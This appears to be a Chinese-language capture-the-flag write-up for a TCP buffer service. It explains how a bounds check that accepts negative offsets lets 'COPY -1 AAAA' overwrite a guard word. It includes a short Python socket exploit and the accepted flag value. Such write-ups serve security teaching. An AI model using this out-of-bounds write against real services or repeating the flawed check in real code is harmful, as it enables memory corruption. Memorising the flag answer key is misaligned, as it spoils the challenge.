## 题目原文

> 一个基于 TCP 行协议的缓冲区写入服务，支持按偏移写入数据、导出缓冲区内容并查看状态。请分析其实现，找出可利用的内存安全缺陷并读取受保护的 flag。

## 题解

### 入口与指纹

TCP 横幅是 `200 copyd ready`。命令是 `COPY <off> <data>`、`DUMP`、`COUNT`、`REVEAL`。`REVEAL` 在守卫还是 0 时回 `423 locked: buffer guard intact`。`DUMP` 先打 `count` 和 `guard=0x........`，再打出一块 1024 字节的缓冲。

### 关键观察

写入范围按「偏移 + 数据长度不超过 1024」检查。`COPY 1020 ABCD` 成功，`COPY 1020 ABCDE` 和 `COPY 1024 AAAA` 都是 `550 copy failed`。缓冲末尾因此写得到，紧挨在缓冲前面的那一字节写不到，只要偏移从 0 开始。

偏移接受负数。`COPY -1 AAAA` 回 `250 wrote 4 bytes at offset -1`。这 4 个字节从缓冲前一个字节开始写，把守卫写成 `0x41000000`（小端的 `A`）。之后 `REVEAL` 不再说 locked，而是把 flag 打出来。

### 利用链

```bash
T=$(head -1 .target)
python3 - << PY
import socket
host, port = "$T".rsplit(":", 1)
s = socket.create_connection((host, int(port)), 6)
s.settimeout(2)
s.recv(4096)
s.sendall(b"COPY -1 AAAA\\n")
print(s.recv(4096))
s.sendall(b"REVEAL\\n")
print(s.recv(4096))
PY
```

本次平台接受的值是 `flag{7ab73d52-f286-4fa7-8886-1f32d83015cf}`。

### flag 位置

`REVEAL` 的响应。守卫在 1024 字节缓冲的前面，只有负偏移能碰到它。
